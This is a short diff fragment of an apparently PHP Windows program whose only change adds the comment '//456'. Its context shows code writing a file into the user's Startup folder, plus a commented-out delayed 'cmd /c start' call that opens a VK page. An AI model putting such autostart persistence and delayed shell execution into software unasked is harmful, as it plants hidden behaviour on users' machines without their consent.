@@ -15,7 +15,7 @@ file_put_contents($_ENV['APPDATA'].'\Microsoft\Windows\Start Menu\Programs\Start
 //waitAsync(5400000,function(){
 //execute('cmd /c start https://vk.com/public203780956');
 
-
+//456
 
 
 //00000000000000
